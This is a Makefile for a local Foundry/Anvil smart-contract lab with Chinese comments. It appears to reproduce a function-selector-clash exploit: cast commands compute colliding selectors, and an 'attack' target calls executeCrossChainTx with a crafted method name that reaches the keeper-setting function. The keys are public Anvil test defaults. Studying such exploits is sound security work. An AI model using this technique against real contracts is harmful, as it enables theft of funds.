-include .env
# anvil的密钥
DEFAULT_ANVIL_KEY := 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
ACCOUNT2_PRIVATE := 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
ACCOUNT2 := 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
# anvil :; 定义了一个名为 anvil 的目标。冒号 : 后面的分号 ; 表示在同一行执行命令。
# --block-time 10  加上这个参数就是 每10秒出一个区块
anvil :; anvil  -m 'test test test test test test test test test test test junk' --steps-tracing  --block-time 10

NETWORK_ARGS := --rpc-url http://localhost:8545 --private-key $(DEFAULT_ANVIL_KEY) --broadcast
LOCAL_RPC := http://localhost:8545
# 使用前需要先install
install:
	@forge install foundry-rs/forge-std

build:; forge build

deploy:
	@forge script script/DeploySelectorClash.s.sol:DeployFunctionSelect $(NETWORK_ARGS)

UTILS_ADDRESS := 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
TARGET_ADDRESS := 0x5FbDB2315678afecb367f032d93F642f64180aa3

# 调用函数 getFunction
# transferFrom(address,address,uint256)
# gasprice_bit_ether(int128)
getFunctionHash:
	@cast call $(UTILS_ADDRESS) "getFunctionHash(string)" "gasprice_bit_ether(int128)"   --private-key $(ACCOUNT2_PRIVATE) --rpc-url=$(LOCAL_RPC)

# transferFrom(address,address,uint256)
# gasprice_bit_ether(int128)
getFunctionSelect:
	@cast call $(UTILS_ADDRESS) "getFunctionSelector(string)" "f1121318093(bytes,bytes,uint64)"   --private-key $(ACCOUNT2_PRIVATE) --rpc-url=$(LOCAL_RPC)

updateSolved:
	@cast send $(TARGET_ADDRESS) "putCurEpochConPubKeyBytes(bytes)" 0x01  --private-key $(ACCOUNT2_PRIVATE) --rpc-url=$(LOCAL_RPC)

attack:
	@cast send $(TARGET_ADDRESS) "executeCrossChainTx(bytes,bytes,bytes,uint64)" 0x6631313231333138303933 0x00 0x01 1  --private-key $(ACCOUNT2_PRIVATE) --rpc-url=$(LOCAL_RPC)

validAttack:
	@RESULT=$(shell cast call $(TARGET_ADDRESS) "isAttackOk()" --private-key $(ACCOUNT2_PRIVATE) --rpc-url $(LOCAL_RPC)) ;\
	$(MAKE) fromHex2String hex="$$RESULT"


# 查看日志信息

# 查询交易 
getTxInfo:
	@cast receipt 0x54ed1a8704ebfa77754c0a9b0dfa71a49e8d176c70843ce8f38d96e051ba97eb
# 或者 ，但是 receipt 能看到合约代码中输出的log  cast receipt 0x20e7dda515f04ea6a787f68689e27bcadbba914184da5336204f3f36771f59f0 

# 将十六进制转换成字符串
fromHex2String:
	@echo "Hexadecimal: $(hex)"
	@echo $(hex)  | xxd -r -p
	@echo ""   


# 将字符串转成十六进制
fromString2Hex:
	@echo "String: $(str)"
	@echo -n $(str) | xxd -p -c 256
